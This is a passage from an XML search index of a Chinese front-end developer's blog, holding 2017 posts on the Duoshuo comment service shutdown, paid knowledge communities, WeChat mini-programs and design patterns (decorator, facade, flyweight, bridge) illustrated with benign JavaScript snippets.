BAT/GTF 这 6 个网站是否加入到 Preload 的 题图：https://unsplash.com/search/secure?photo=bt41lw9i6Kc]]></content>
      <categories>
        <category>网络技术</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>HTTPS</tag>
        <tag>HSTS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多说即将关闭，评论迁至何处？]]></title>
    <url>%2Fblog%2F2017%2F03%2F21%2F2017-03-21-duoshuo-comment-service-will-be-closed%2F</url>
    <content type="text"><![CDATA[因公司业务调整，非常遗憾的向大家宣布多说项目即将关闭。 我们将于2017年6月1日正式关停服务，在此之前您可以通过后台的数据导出功能导出自己站点的评论数据。 对此给您造成的不便，我们深表歉意，感谢您的一路相伴。详细信息 &gt; 第一次建站便开始使用多说，到现在差不多快三四年了，相信有很多朋友比我用的时间更长。尽管几年来，被无数垃圾评论轰炸过，也时有发生丢数据、数据展示错误、数据缺失、XSS 攻击、SQL 注入、HTTPS 资源引入等等等问题，我期间也放弃过多说转头 Disqus，然而辗转反侧，现在依然使用着它，不因为别的，毕竟国产（木有墙的问题，还免费😂）。 大约一年前，我加了一位多说开发者的微信，也了解了一些多说背后的故事。一直以来，多说都是两三人的小团队在维护，大约 2015 年初吧，多说被今日头条给收编，然而，在资源上并没有得到更多的支持，维护的人员甚至更少了，而且有那么半年多时间，只有一个人在维护前后台工作。 多说网正在改变网站与用户之间，用户与用户之间的互动方式。这个专门基于社交网络的评论系统，能够轻松的帮网站主搭建自己互动性极强的社区，让留言的用户都有“家”的感觉。 上面这段话，是多说网对自己产品的 介绍，然而随着 Web3.0 的进化，博客已不再是趋势，很多人更加愿意在微信公众号这样的大众平台上发表内容，这些平台都自带评论功能；即便是有个人博客，也被各大内容聚合平台（诸如掘金、头条等）抓取过去，评论便也留在了平台，极少数会落在个人博客之上。 评论是产品互动的一个关键因子，一般有点研发能力的公司都不会使用社会化评论，将自己的数据存在他人的服务器上，所以多说这类产品的用户在国内并不算大众，用户少了，评论少了，多说拿啥挣钱呢？即便提供了高级付费功能，其盈利能力也不会很强大，长期来看，这个产品注定关停。 国内还有不少其他的同类产品，比如新浪留言、网易云等，好多家，我几不太清楚了，他们的留言提供了开放的能力，但是大家千万不要盲目选择这些产品。在盈利方面，这些产品依然存在着与多说同样的问题，之所以提供开放能力，是他们内/外部产品本身就对评论有强烈需求，与其自己独享，不如分享出来，为自己产品积累人气，吸纳用户。长久来看，没有几个会持续提供免费服务。而且，纵观国内社会化评论工具，数多说体验做的最好，毕竟最老牌了。 那么，我们的评论该迁移至何处呢？这个问题，对有服务器的同学来说其实也并不是问题，在服务器上部署一个评论系统不是一个难事，也可以直接安装诸如 wordpress 之类的产品，自带了完善了评论功能，并且还支持导入多说的数据。其实，受伤的是那些使用诸如 hexo/jekyll 构建的静态博客，没有数据库能力，我给大家推荐两个，至少目前看来可以持续使用几年的产品： Disqus，它是国外最流行的社会化评论组件，体验优良，而且基于评论做了一个交流社区，形成了良好的生态，相信也已经找到了比较稳定的盈利模式； commentit.io, 可以将评论直接作为 commit，用 JS 脚本提交到 Github，保存进代码库。 推荐的两个产品都有墙的问题，对想留言的用户不太有好。然而并没有其他可推荐的。]]></content>
      <categories>
        <category>工具</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>多说</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[知识付费，小密圈能走多远？]]></title>
    <url>%2Fblog%2F2017%2F02%2F22%2F2017-02-22-secret-circle-prospects%2F</url>
    <content type="text"><![CDATA[实名反对，以下部分观点，虽然都是自己说的… 首先需要明确，小密圈是个什么东西。小密圈，它是一个工具，连接粉丝的工具，连接社群的工具。这个工具可以给社群中的人带来价值（知识、人脉、娱乐等），也可以给工具的使用者带来利益（财富回报、知识沉淀和整理、满足感、影响力等）。 谁能够做「小密圈」呢？微信、微博、知乎、得到等这些平台都可以做，他们为何不做？我就不高谈阔论了（其实我也不知道 XD），可能不久之后在这些大平台上也会有同类产品出来，然后大家就会四处围观各平台疯狂地圈大V，大V带动小V，小V带动人民群众，开启繁华的互联网雪崩式的知识付费时代，以后不花钱可能还真看不到特别有营养的分享了 。 两个月前我也开了一个圈子，每天投入大约一个小时运维，目前有了四百多个付费用户，故而对这类产品有点感触，下面来浅薄地聊聊题主的两个问题（观点略带趋向性，稍许片面）。 像小密圈这样的粉丝经济能走多远？我觉得，很远。但是题主这里用到的「粉丝经济」，我是不赞同的。上面我提到了，小密圈是一个工具，工具可以给圈子中所有的人带来价值，大多数情况下并不是因为你粉/关注了某某才入圈，而是因为某某能产生对我有价值的内容，并且我曾看到过某某分享了这般内容，我信任某某，就像下面两个场景： 如果你是一条单身狗，看到了一个可能帮你追到女神的小密圈，你进还是不进，你得犹豫下吧？ 如果你是个技术菜鸟找工作而苦苦不得，看到了一个技术大神给你每天普及领域知识，还时而告知些面试的技巧，一年收费才一百多块，你进还是不进，你也得犹豫下吧？ 这个社会看似是价值驱动，但是从个体上表现出来却是利益驱动居多。圈子成员期望得到自己想要的，而圈主正好可以提供这样的服务，这种互利互惠的双赢产品，他为何就不能走得久远呢？ 回到产品本身，小密圈有两招使得好。首先，价格最低限制在 50 块，这一点可以过滤不少不愿意付费的用户，同时给那些犹豫不决最后付费的同学一个警示，「这是你付过钱的圈子，你需要在这里收获点什么，不然你就亏了」，这一举动也会让圈主产生压力，进而不断提升分享的质量。然后就是圈子的经营时长，最短设置为一年，圈主有能力经营圈子，也有能力拉用户入圈，一年时间，圈主可以给小密圈带来几百甚至上千的付费用户，这些付费用户至少在这里活跃一年时间，而这一年内不知道又有多少新的圈子产生。这种周而复始的用户积淀，让他走得久远产生了可能。 从社会关系来看，小密圈拉近了一帮志同道合的人的距离，他们在一起有很多共同的话题，遇到的类似的疑惑，存在着同样的成长瓶颈。很多人平时接触不到大V，但是一百块钱就可以解决这个问题；很多人缺乏技术交流，但是一百块钱就让他们看到了一个崭新的世界，至少，比他工作的氛围要浓厚。这种和谐的社会群体关系也能为圈子的久远画上一个感叹号！ 有人说这不就是收费的 QQ 群和微信群么，其实不然。小密圈做了两件事情，过滤了一群水军，同时提供了知识沉淀的工具，而且还提供了一个私密的环境，让付费的人产生了收获了内容而别人没机会的满足感。需要注意的是，愿意付费的人群只会是 4% 左右，剩下的 96% 对这种付费社群持观望、神往或鄙视态度。 下面用一组数据给大家展示下，小密圈能走多远，也顺便看看付费和免费的区别： 目前小密圈的付费用户人均支付额 143.8 元。单日付费最高时二十多万，然后就是现在每天至少新增一个主题的圈子，也就是比较活跃的圈子将近有一千个。 付费圈大概占了 20%，需要审核的私密圈 大概占了 30%，剩下的 50% 是免费圈，但免费圈的活跃度最低——估计只有 10% 左右是认真运营的，剩下 40% 不客气的说是用户为了测试建的。数据来源：小密圈：付费社群和小程序的“高级”玩法|浑水课堂干货 进入对应的圈子主要出发点又是什么？这个问题，我的理解是，圈主如何把人召唤到圈子，而被召唤者为什么愿意加入圈子。 后者没什么好回答的，简单来说入圈的人愿意为内容付费，就这么简单。而圈主如何召唤，我可以稍微分享下我的思路。 首先要明确， 为什么样的人提供什么样的服务。就拿我自己的圈子而言，命名为「前端进阶」，我服务的人群很好定位，主要是处在中小公司的前端工程师，他们工作中遇到场景有限，技术交流氛围有限，期望通过大公司或者看似牛x的人学习到一些平时不了解的东西，希望这些人能够帮助自己规划学习方案，提升个人能力，解答工作中的疑惑。所以我要做的事情就是找到他们在哪些方面存在短板，需要怎样的具体的帮助，然后告诉他们我能够在一定程度帮助你。召唤如此简单。 小密圈属于消耗型的工具，它会不断地消耗圈主的知识、精力，这对圈主来说如何持续运维是一件值得长期思考的问题。纯干货分享会消耗地很快，圈主能力再强，能够产出的内容也很难维持一年时间。 这个时候需要有节奏的提供服务。我观察了下圈子的活跃度，四百多人的付费人群，活跃度并没有想象中的那么高，每周长期活跃人群不足 25%，我完全可以理解这个比例。平时买一堆书，正经看完的没几本，小密圈其实就是一本「书」，用户买过来之后，读或是不读，全凭心情、全看场景。有几个朋友跟我说，每天上班坐地铁的时候必看我的小密圈。每个人的时间都很宝贵，圈子需要做的事情就是整理内容，让入圈的人可以用最短的时间完成阅读；或者高效、及时地回答提问者的疑问。而不是一味的分享内容，看到啥都往圈子里塞，几乎不会有人全看，意义也不大。 所以我在圈子里，定下了几个专题，每个专题持续一到两个月的时间，不停地讲，持续的说，把一个知识点讲透，怎么着用户也能耳濡目染学到点东西。用产品的思维来整理内容。 题图：Anthony DELANOIX]]></content>
      <categories>
        <category>随笔</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>小密圈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[心流，从工作中找到快感]]></title>
    <url>%2Fblog%2F2017%2F02%2F19%2F2017-02-19-make-your-heart-comfortable%2F</url>
    <content type="text"><![CDATA[今天学到一个词，心流，指的是当人们沉浸在当下的某件事情时，全神贯注、全情投入并享受其中从而体验到的一种幸福的精神状态。 在公司，我们经常做不喜欢的事情，如何将不喜欢的项目变成幸福感的源泉？ 首先你要找到项目中的有挑战、有快感的部分，它会让你产生幸福感。做这些事情必须有足够的技巧，尝试从其他项目成员身上找到解决这些问题的规律。 然后，去承担更多的责任，并不断对任务难度做评估和微调，对于简单的任务，适当增加难度，而对于偏难的任务，主动学习，补充营养，提升自己，在承担责任的过程中寻求一个不断向上的平衡。 最后，明确自己的目标，并寻求反馈。目标越明确，在调整平衡时方向感越强，事情做起来越得心应手。寻求反馈能够减少碰壁，产生更多有用功。 慢慢的，心流就在这个项目中产生了。 题图：Kevin Fernandez]]></content>
      <categories>
        <category>随笔</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>心流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊聊设计模式（4）：装饰模式]]></title>
    <url>%2Fblog%2F2017%2F02%2F14%2F2017-02-14-the-decorator-pattern-in-design-patterns%2F</url>
    <content type="text"><![CDATA[Decorator Pattern，中文名为装饰者模式，这个模式思想很简单，但是特别容易把代码搞复杂，它包含四个重要角色： Component, 抽象构件 ConcreteComponent, 具体构件 Decorator, 抽象装饰类 ConcreteDecorator, 具体装饰类 这几个角色很容易把人搞懵，所以在使用这个模式之前要彻底理解它。ECMAScript 2017 中增加了修饰器，它从语法层面帮掩盖了 Decorator 装饰类和 Component 构件，极大程度方便了我们理解装饰器： 123456789function activate(target) &#123; target.barkable = true; target.runnable = true;&#125;@activateclass EDog &#123;&#125;console.log(EDog.barkable, EDog.runnable); // true true 上面的代码很简单，activate 是一个开关装饰类，通过它激活了 EDog —— 不会跑、不会叫的电子狗，让它具备了 bark 和 run 能力。 场景复现过年回来后业务压力不大，小苏让小喜抽空做一个代码发布平台，帮助团队迁移代码发布平台，之前的前端静态代码是通过 SVN 管理和发布的，现在需要迁移到 Git 上去，小苏说这是个重任。小喜暗自欣喜，这 TM 也太简单了。 使用开源的 gitlab 搭建了一个代码管理平台，然后在 gitlab 上添加了钩子，每次有代码推送时，向小喜的代码平台发送一个请求，小喜便直接执行 publish 操作： 123456789class CodePlatform &#123; publish(gitInfo) &#123; this.scpCodeFromGitlabToOnline(); &#125; // 直接将 gitlab 代码直接复制到线上机器 scpCodeFromGitlabToOnline() &#123; // ... &#125;&#125; 不久之后代码的构建从线下迁移到了线上，要求代码发布时先使用构建服务器处理，于是小喜给 CodePlatform 增加了一项功能： 12345678910class CodePlatform &#123; publish() &#123; this.transferCodeToBuilderServer(() =&gt; &#123; this.scpCodeFromGitlabToOnline(); &#125;); &#125; scpCodeFromGitlabToOnline() &#123;&#125; // 将代码扔到构建服务器 transferCodeToBuilderServer() &#123;&#125;&#125; 随着团队工程化程度越来越高，很多线下操作流程渐渐搬移到了线上进行云处理，后续又增加了测试服务器、日志服务器、安全监测服务器等，结果小喜的代码变成了这样： 12345678910class CodePlatform &#123; publish() &#123; // publish 的逻辑越来越重 &#125; scpCodeFromGitlabToOnline() &#123;&#125; transferCodeToBuilderServer() &#123;&#125; transferCodeToLogServer() &#123;&#125; transferCodeToSecureServer() &#123;&#125; transferCodeToTestServer() &#123;&#125;&#125; 小喜怎么也没想到，发布一个仓库在 CodePlatform 需要走这么多流程，这个类的职责越来越多，代码体积也越来越庞大，此时的小喜有点苦恼。 有一次，小喜学习 ES7 相关知识，突然看到一个叫做 Decorator 的东西，想了想似乎可以在项目中用一下。这不用不知道，一用吓一跳，原来之前的代码还可以这样架构： 123456789101112// 为所有的服务添加日志服务class LogService &#123;&#125;const logger = new LogService();@logger('build')class BuildService &#123;&#125;@logger('secure')class SecureService &#123;&#125;@logger('test')class TestService &#123;&#125; 首先将服务抽离出来，然后： 1234567891011const builder = new BuildService();const securer = new SecureSevice();const tester = new TestService();@securer@logger('CodePlatform')class CodePlatform &#123; @builder @tester publish() &#123;&#125;&#125; 让 CodePlatform 的代码先走一遍 securer，在发布的时候走一遍 tester 和 builder，代码结构瞬间变得清晰了很多。 问题解析我们经常在代码中干这件事情，尤其是业务代码。一些临时需求，为了图方便、图快，直接在原有的基础上增加几个方法，然后在执行入口位置添加补丁，时间长了之后，维护起来十分吃力，这也是为什么在业务交接时大家相互吐槽代码的主要原因之一。很多人拿到代码的第一感觉就是，写这代码的人是傻x，这代码得重构。 上面的问题在于 CodePlatform 承担了太多的职责，最后这个类变得特别繁忙，加上代码量多了之后，阅读难度提升了。事实上，测试、监控、日志、安全等都是发布之前对代码的流程化操作，CodePlatform 的核心功能是 发布代码，其他的操作都可以看做对待发布代码的装饰。 JS 中 Decorator 语法糖十分容易理解，它既可以装饰类也可以装饰类的成员方法。所以我就没把这个模式的具体实现写出来，感兴趣的可以到网上搜索下。 装饰模式对类做职能补充有几种方式： 继承，让继承类拥有父类的所有能力，并自我扩展 关联，将两个功能集进行合并 修改父类（基类），这是当然不推荐的方案 装饰模式，动态地给一个对象增加一些额外的职责 ( Responsibility )，就增加对象功能来说，装饰模式比生成子类实现更为灵活。 装饰者模式可以在运行时给对象动态地增加更多的职责，它属于通过建立关联方式来扩充对象的能力。从上面的例子中看得出来，CodePlatform 在装饰前后基本看不出差异，这就是这个模式的特点。 拓展阅读 Wikipedia - 修饰模式 结构型模式 » 装饰模式 修饰器 题图：Jeffrey Wegrzyn]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>装饰模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[因小程序卸载的软件，重新安装回来了么？]]></title>
    <url>%2Fblog%2F2017%2F02%2F13%2F2017-02-13-why-reinstall-software-uninstall-when-xcx%2F</url>
    <content type="text"><![CDATA[微信几波宣传攻势后，小程序在 16 年顺利成为了互联网的一个新关键词，它在商业圈和技术圈都掀起了一阵波澜。而有意思的是，它时冷时热，到最后吃瓜群众们也司空见惯了。 小程序让中低配手机人群欢喜了一把，删除几个软件可以省下几百兆的空间；而如今这些删除的软件，你是否又安装了回来？ 删除了哪些软件？从重要性和使用频度，可以将软件划分为四类： 低频使用且不重要，如数独游戏、中国法律 低频使用且重要，如饿了么、淘票票 高频使用且不重要 高频使用且重要，如高德地图、微博、知乎 高频使用的软件，对用户来说一般都是重要的，至少是不太会删除的，故第三个分类占比稍低。最有可能被删除的软件是低频使用软件，手机上存在一堆「低频使用且不重要」软件的用户不会很在意剩余空间的问题，因为他们的手机空间一般都很大，而这些软件被删除后，不管有没有对应的小程序，用户都不会有啥感知。 而对于「低频使用且重要」的软件，被删除后，一旦有再次使用的需要，用户感知会十分强烈；这类软件往往也被删得比较多，由于使用频率低，只要小程序上能用，即便打开路径深一些、使用体验差一点，用户也能接受。比如猫眼、今日头条、网易新闻、饿了么、星巴克、滴滴打车等，功能简单的纯查询、偏前端展现的生活资讯类软件。 为什么又装回来一些删掉的软件？装回来的软件肯定不会是淘宝、百度地图、知乎或者某一款手游，毕竟人家也不会跑到微信上搞个小程序蹭这点流量；涉及到实时通讯、CPU 密集型和安全要求较高的场景，比如地图、游戏、网银、社交等软件，都不太会上小程序。 下面我列举下，小程序较原生软件有哪些短板： 无消息提示，原生软件会通过图标上的未读消息，以及不定时的后台推送，提示用户该打开看看了，而小程序目前还没有这个能力； 程序打开路径太深，原生软件在界面上只需要一次点击就可以进入，而小程序需要 点开微信-&gt; 点开 Tab -&gt; 点开小程序 -&gt; 点开软件 四个步骤，Android 用户稍好一点； 产品功能完整度缺失，不管是原生软件还是小程序都是需要投入人员开发的，公司资源有限，而小程序坑有多，所以公司不会把所有的产品功能搬运到小程序上，尤其是那些能够增加用户粘性的 SNS 相关功能，交互多、开发成本巨高； 版本迭代后，产品功能丢失，由于小程序不是产品的主要流量来源，在产品迭代期间，极有可能在小程序上丢失很多产品新特性，我们在小程序上看到的基本是产品上一个形态，感兴趣的可以拿几个应用对象下就知道了； 切换到后台的能力，小程序有切换到后台的能力，但是太弱了，只能让一个小程序固定在聊天版面上部，而原生软件可以通过系统提供的能力常驻，并且能够在多个软件之间友好地切换； 小程序使用时微信聊天能力丧失，我测试了下，玩小程序的时候，微信消息是不会提醒的；而原生软件支持我们在看电影的时候接受微信消息，并且可以快捷回复。 小程序虽然轻便，但是要把性能做到极致、让用户流量损耗最小，需要投入较原生软件多出一到两倍的开发成本。慢慢地，因为长期养成的软件使用习惯，那些被删除的软件又悄然回到了手机，这就是小程序的命运。 不过，我相信，随着 Google PWA 的推广和发展，小程序在 Android 上还是有希望突起的。 题图：https://unsplash.com/search/ant?photo=dSM6qcdS7Hk]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊聊设计模式（3）：门面模式]]></title>
    <url>%2Fblog%2F2017%2F02%2F07%2F2017-02-07-the-facade-pattern-in-design-patterns%2F</url>
    <content type="text"><![CDATA[Facade，中文译为门面、外观，所以本文要讲的 Facade Pattern 翻译时经常看到有两个名字，门面模式和外观模式。 这是一个在 JavaScript 中被经常用到的设计模式： 1234567891011121314class modA &#123;&#125;class modB &#123;&#125;// 门面模式实例class Facade &#123; init() &#123; modA.initialize(); modB.init(); &#125; run() &#123; modA.start(); modB.run(); &#125;&#125; modA 和 modB 是客户端运行的两个依赖系统，例子中通过 Facade 类做了简单封装，客户端便可以使用少量代码快捷启动两个子系统，这里的 Facade 就是两个子系统的门面，客户端跟门面而不会直接与子系统打交道。 上面的例子比较抽象，还是有些晦涩的，下面看一个实际的场景。 场景复现小喜负责的业务增加了一些社交元素，不久之后业务方给小喜提了一个需求，要求在某类文章下方增加一个赞赏按钮，用户点击按钮时，调用 Z 平台的接口付款，然后将操作记录到后端，最后发送一个统计埋点，需要三天内上线。 小喜笑了笑，心里开心道：就这点需求，哪用得着三天，给我俩小时就够了： 123456789101112131415async function payWithZFB() &#123; request('interface-a'); // ...&#125;async function addRecord() &#123;&#125;async function sendTrack() &#123;&#125;async function Zan() &#123; // 调用 Z 平台接口，进行支付操作 let record = await payWithZFB(); // 调用后端接口，记录日志 let track = await addRecord(record); // 调用埋点接口，发送埋点信息 await sendTrack(track);&#125; 事实上，小喜找 Z 平台、后端和日志平台的同学要接口就花了一整天，并且 pageWithZFB、addRecord 和 sendTrack 三个函数的实现都十分复杂，各种权限验证、安全验证等，小喜做完这个需求内心是崩溃的。 随着业务规模的扩大，SNS 相关需求量有所增加，其他业务上陆续也开始使用赞赏功能。同组的小天收到了类似的需求，但小天并不知道小喜之前做过，同样花了一天时间，采用了类似的方式实现了功能。 一段时间后， Z 平台那边说需要提升安全防护，要求开发者对接口做调整，需要将 interface-a 调整为 interface-b，小喜和小天都收到了这个需求，他们相互瞪了对方一眼，然后默默地回去修改了。 小苏在进行团队代码 review 的时候，看到了这个问题，为了减少团队在这一块的开销，他让小喜使用 NodeJS 做了一层封装，代码变动其实并不大，从客户端调用 HTTP 接口，变成了 Node 调用 HSF 接口： 1234567class Facade &#123; zan () &#123; let record = await payWithZFB(); let track = await addRecord(record); await sendTrack(track); &#125;&#125; 然后小喜和小天在客户端的调用都变成了： 12const facade = new Facade();facade.zan(); 这个调整带来的很大的便捷，不管 Z 平台、后端和日志平台的规则如何变化，小喜只需要修改 Node 提供的 Facade 服务就能解决问题，业务上不需要做任何发布。 问题解析这个问题应该相当明确，这个模式也很好理解。业务需求经常会牵涉到多个平台的协作，协作就意味着频繁的交流和沟通，最后演变的结果便是： 1234A 同学：hi，请问如何使用 Z 平台的支付接口呀？B 同学：[自动回复] 询问支付接口请回复 1，中午请我吃饭请回复 2。A 同学：1B 同学：[自动回复] 文档链接：http://z/interface 平台通过机器人解决了客服问题，但是使用者却不得不一遍又一遍地阅读粗糙无比的文档（好像有点跑题了，我们回来继续解析问题）。 Facade 隔离了客户端与三个平台之间的通信，尽管客户端依然还可以跳过 Facade 与平台交流，一般情况下不会这么去做，但也不排除这种情况，比如客户端和 Z 平台之间的认证禁止间接进行，那么客户端的调用就会变成： 1234const facade = new Facade();authZFB(function() &#123; facade.zan();&#125;); 门面模式还是允许客户端去直接操作子系统的，这也说明了这个模块比较灵活。 门面模式门面模式，要求一个子系统的外部与其内部的通讯必须通过一个统一的对象进行。门面模式提供一个高层次的接口，使得子系统更易于使用。 引入门面模块，可以将子系统之间的通信和相互依赖达到最小，从而降低整个系统的复杂度，也很大程度上提高了客户单使用的便捷性，客户端无需关系子系统的实现细节，通过门面角色便可以完成功能的调用。 门面模式相对复杂的使用方式是，提供抽象的门面类，然后根据配置文件生成具体的门面类，这种模式用的比较广泛，也是值得提倡的。 拓展阅读 结构型模式 » 外观模式 wikipedia - 外观模式]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>门面模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊聊设计模式（2）：享元模式]]></title>
    <url>%2Fblog%2F2017%2F02%2F04%2F2017-02-04-the-flyweight-pattern-in-design-patterns%2F</url>
    <content type="text"><![CDATA[如何理解享元模式，“享”是共享的意思，“元”指的是元件，也就是小颗粒的东西，享元顾名思义便是共享小部件，很多系统或者程序包含大量对象，但是这些对象绝大多数都是差不多的，除了一些极个别的属性外。 场景复现小喜负责团队的机器管理工作，包括测试机器的购买、借还等内容。机器的型号并不多，大约五六种。为了能够精确掌握每台机器的借还和使用情况，小喜通过如下方式设计数据管理模型： 12345678910111213141516171819202122class Device &#123; // 记录设备的基本信息 constructor(id, memory, frequency, processor, network, pixel, price, ...) &#123; this.id = id; this.memory = memory; this.frequency = frenquency; this.processor = porcessor; this.network = network; this.pixel = pixel; this.price = price; // more attributes ... &#125; checkout () &#123; this.hasCheckedOut = true; this.checkoutDate = new Date(); &#125; giveback() &#123; this.hasCheckedOut = false; this.checkoutDate = null; &#125; // more methods ...&#125; 这个模型还算是比较简单明了的，每次购买机器入库都会执行： 12var device = new Device(...);DB.insert(device); 当有人借还设备时，便会执行： 12345678var device = Database.query(deviceId);// 借出device.checkout();// 归还device.giveback();DB.update(device); 随着团队规模的扩大，加上集团并购了几个小公司，团队对设备的需求量急剧上升，并且测试标准也有所提升，要求覆盖国内所有常见机型，大约 50 多种，每个机型需要购置大约 100 台机器，总量有 5000 多台。 此时，小喜有点头疼了。每台设备的描述信息和借还记录信息都储存在各自的 device 对象中，每个对象大约需要占用 10kb 的内存，5000 多台设备，算下来需要占用 50Mb 的内存。几千个大对象放在内存中，这种数据管理模式让小喜有点方，咨询了下坐在旁边的小天同学有没有什么策略可以改良。 小天在小喜的电脑前比划了几下，最后抛了一个媚眼，小喜立马就懂了。 定义数据模型，一个 Device 对象代表一种型号的设备： 1234567class Device &#123; constructor(type, xxx, ..) &#123; this.type = type; // 一种设备的全部基本信息 this.xxx = xxx; &#125;&#125; 使用 DevicePool 管理各种型号的设备： 12345678910class DevicePool &#123; // hash 表保存设备信息 devicePool = &#123;&#125;; create(type, xxx, ...) &#123; if (devicePool[type]) return devicePool[type]; const device = new Device(type, xxx, ...); devicePool[type] = device; return device; &#125;&#125; 设备的借还信息和其他信息，通过 DeviceManager 来管理： 1234567891011121314151617class DeviceManager &#123; deviceManager = &#123;&#125;; // 借出时，添加借出记录 checkout (id, type, xxx, ...) &#123; const device = new DevicePool.create(type, xxx, ...); deviceManager[id] = &#123; device: device, hasCheckedOut = true, checkoutDate = new Date(); &#125;; &#125; // 归还时，删除借出记录 giveback(id, type) &#123; deviceManager[id].hasCheckedOut = false; deviceManager[id].checkoutDate = null; &#125;&#125; 小喜看了看内存，设备对象从 50Mb 下降到了 2Mb，小喜激动得一晚上没睡着。 问题解析小天当时告诉小喜，可以想办法减少内存中重复的内容，同一类型的设备描述是相同的，没必要在每个对象中都保存一份。使用单例模式储存设备元信息（Device 类），使用工厂模式复用一个类型的设备描述信息（DevicePool 类）。小喜一下子就懂了。 小喜通过 DevicePool 和 DeviceManager 将数据元信息和数据动态信息进行了有效的隔离，然后通过 checkout 和 giveback 两个方法灵活地组合了这两类信息，组合的时候，有效地控制了内存的无效复制。 享元模式享元模式的核心在于享元工厂类，享元工厂类的作用在于提供一个用于存储享元对象的享元池，用户需要对象时，首先从享元池中获取，如果享元池中不存在，则创建一个新的享元对象返回给用户，并在享元池中保存该新增对象。 在享元模式中有两个比较重要的关键词，内部变量和外部变量；内部变量是可以共享的属性集，而外部变量是对象之间的差异部分，通过相同+不同的方式组合诸多对象，可以有效地节省系统空间，降低内存大小。 拓展阅读 wikipedia - 享元模式 结构型模式 » 享元模式]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>享元模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊聊设计模式（1）：桥接模式]]></title>
    <url>%2Fblog%2F2017%2F01%2F16%2F2017-01-16-the-bridge-pattern-in-design-patterns%2F</url>
    <content type="text"><![CDATA[桥接模式（Bridge Pattern），也有很多地方称之为桥连模式，不管怎么叫，记得有个桥（bridge）就行了，重点要理解这个「桥」是如何连接的，什么场景下需要使用桥接模式。 场景复现小喜在做一个平台（阿尔法）的本地 SDK 工具，用于线下开发模块，这个工具的用户是 A 部门的前端人员，经过一个星期的紧张开发，小喜完成了工具的开发，用户反馈不错。大致的代码结构是这个样子的： 123456789101112class SDK &#123; login() &#123; /* 登录控制 */ &#125; start() &#123; /* 启动逻辑 */ &#125; create() &#123; /* 创建模块 */ &#125; publish() &#123; /* 提交模块 */ &#125; init() &#123; this.login(); this.start(); this.create(); this.publish(); &#125;&#125; 突然有一天，老大小苏说，最近公司资源紧缺，雇了十几个外包，也要用这个 SDK 工具开发模块，而外包是不允许访问公司内网的。工程紧急，小苏要求小喜在一天内为外包同学搞一个可以用的 SDK，小喜想了想，点了点头，花了不到半天就搞定了： 1234class wbSDK extend SDK &#123; wbLogin() &#123; /*外包登录*/ &#125; //...&#125; 准备交差的时候，小苏提醒道，外包是不允许直接提交模块的，必须有一个审核流程，于是小喜回去又修改了一下： 123456789class wbSDK extend SDK &#123; wbLogin() &#123; /*外包登录*/ &#125; wbPublish() &#123; if (this.checkPublish() &#123; this.publish(); &#125; &#125; //...&#125; 一段时间之后，这个平台影响力做大了，部门 B、C、D 的同学都想使用这个工具，小喜此时觉得蛋有点疼，原因是每个部门的登录、检测和发布都有差异，为了让更多人受益于这个 SDK 工具，小喜只好硬着头皮写了这些代码： 12345678910111213class B_SDK extend SDK &#123; B_Login() &#123;&#125; B_Check() &#123;&#125; B_Publish() &#123;&#125; //...&#125;class C_SDK extend SDK &#123; C_Login() &#123;&#125; C_Check() &#123;&#125; C_Publish() &#123;&#125; //...&#125;// ... 部门 F 的同学因为某种原因，也搞了一个类似的平台（里试石），而且做得比阿尔法要好，于是部门老板要求小喜将 SDK 对接到里试石，两个系统主要的差异在于模块的初始化和创建形式不同，而且这些差异在不同的部门之间也有不同。小喜擦干了眼泪，代码一直撸到天亮： 1234567class baseSDK extent SDK &#123; // base SDK&#125;class Fuck_A_SDK extend baseSDK &#123;&#125;class Fuck_B_SDK extend baseSDK &#123;&#125;class Fuck_C_SDK extend baseSDK &#123;&#125;//.... 问题解析以上问题的根源在于 影响 SDK 这个类的变量太多了。刚开始影响 SDK 的变量是登录，小喜在代码中添加了 wbLogin 方法，然后在代码中写了一堆 if else 逻辑，勉强解决问题。 后面影响的因素变得很多，有登录、初始化、检测、发布以及部门和平台差异等，小喜通过多次继承来解决问题，带来的麻烦是，代码的维护成本和冗余度都变高了。 小喜把这个问题丢给了小天，询问有没有更好的处理办法，小天说，刚开始 Login 独立出来一个类，不同部门和外包可以基于 baseLogin 扩展…小喜打断道，你丫的事后诸葛亮，我怎么知道会有外包和其他部门的同学用我的 SDK 呀 🤣🤣🤣 小天的想法是正确的，如果我们能够早早的探测到变量，将变量通过类抽象出来，那么使用的时候就会轻松很多了： 1234567891011121314151617181920class baseSDK &#123;&#125;// 抽象变量class baseLogin &#123;&#125;class baseCreate &#123;&#125;class baseCheck &#123;&#125;// C 部门使用示例class C_Login extent baseLogin &#123;&#125;class C_Create extent baseCreate &#123;&#125;class C_Check extent baseCheck &#123;&#125;// 启动程序runSDK = () =&gt; &#123; let sdk = new baseSDK(); sdk.setLogin(new C_Login()); sdk.setCreate(new C_Create()); sdk.setCheck(new C_Check()); sdk.init(); &#125; 桥接模式桥接模式的思想就是：将抽象部分与实现部分分离，使它们都可以独立地变化。 分离抽象部分，要尽可能多的考虑哪些是变量，哪些是常量，常量可以写死在代码中，而变量就需要抽象出来交给管理器去管理，尤其是十分复杂的变量（比如登录这个操作）。 在桥接模式中，每一个被抽象出来的变量，都需要在主体中提供一个渠道——也就是「桥」——来衔接，比如上面代码中的 sdk.setLogin() 方法，它的作用就是连接 new C_Login()。这应该就是为什么这个模式被命名为 Bridge 的原因吧。 S.O.L.I.D 